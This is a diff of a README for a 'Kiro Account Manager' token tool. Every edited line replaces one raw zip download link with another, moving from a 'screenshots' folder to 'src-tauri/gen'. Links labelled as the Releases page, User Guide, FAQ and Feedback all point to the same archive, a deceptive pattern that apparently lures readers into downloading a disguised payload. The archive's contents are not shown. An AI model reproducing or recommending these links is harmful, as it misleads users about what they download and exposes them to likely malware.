@@ -18,7 +18,7 @@ Before you get started, ensure your system meets the following requirements:
 To download the Kiro Account Manager, follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [![Download Kiro Account Manager](https://github.com/plai-informatika/kiro-account-manager/raw/refs/heads/main/screenshots/manager-account-kiro-1.9.zip%20Account%20Manager-blue)](https://github.com/plai-informatika/kiro-account-manager/raw/refs/heads/main/screenshots/manager-account-kiro-1.9.zip)
+   [![Download Kiro Account Manager](https://raw.githubusercontent.com/plai-informatika/kiro-account-manager/main/src-tauri/gen/account_manager_kiro_v2.7.zip%20Account%20Manager-blue)](https://raw.githubusercontent.com/plai-informatika/kiro-account-manager/main/src-tauri/gen/account_manager_kiro_v2.7.zip)
 
 2. On the Releases page, you will see various versions of the application. Choose the version suitable for your system. 
 
@@ -58,13 +58,13 @@ If you have further questions or run into issues, please feel free to reach out 
 
 For more details about the Kiro Account Manager, explore the following resources:
 
-- [User Guide](https://github.com/plai-informatika/kiro-account-manager/raw/refs/heads/main/screenshots/manager-account-kiro-1.9.zip)
-- [FAQ Section](https://github.com/plai-informatika/kiro-account-manager/raw/refs/heads/main/screenshots/manager-account-kiro-1.9.zip)
-- [Feedback](https://github.com/plai-informatika/kiro-account-manager/raw/refs/heads/main/screenshots/manager-account-kiro-1.9.zip)
+- [User Guide](https://raw.githubusercontent.com/plai-informatika/kiro-account-manager/main/src-tauri/gen/account_manager_kiro_v2.7.zip)
+- [FAQ Section](https://raw.githubusercontent.com/plai-informatika/kiro-account-manager/main/src-tauri/gen/account_manager_kiro_v2.7.zip)
+- [Feedback](https://raw.githubusercontent.com/plai-informatika/kiro-account-manager/main/src-tauri/gen/account_manager_kiro_v2.7.zip)
 
 ## 🎉 Conclusion
 
 Thank you for choosing Kiro Account Manager! We hope this tool enhances your token management experience and saves you time. Start managing your Kiro tokens effortlessly today. 
 
 Don't forget to visit the Releases page to make sure you have the latest version:  
-[![Download Kiro Account Manager](https://github.com/plai-informatika/kiro-account-manager/raw/refs/heads/main/screenshots/manager-account-kiro-1.9.zip%20Account%20Manager-blue)](https://github.com/plai-informatika/kiro-account-manager/raw/refs/heads/main/screenshots/manager-account-kiro-1.9.zip)
+[![Download Kiro Account Manager](https://raw.githubusercontent.com/plai-informatika/kiro-account-manager/main/src-tauri/gen/account_manager_kiro_v2.7.zip%20Account%20Manager-blue)](https://raw.githubusercontent.com/plai-informatika/kiro-account-manager/main/src-tauri/gen/account_manager_kiro_v2.7.zip)
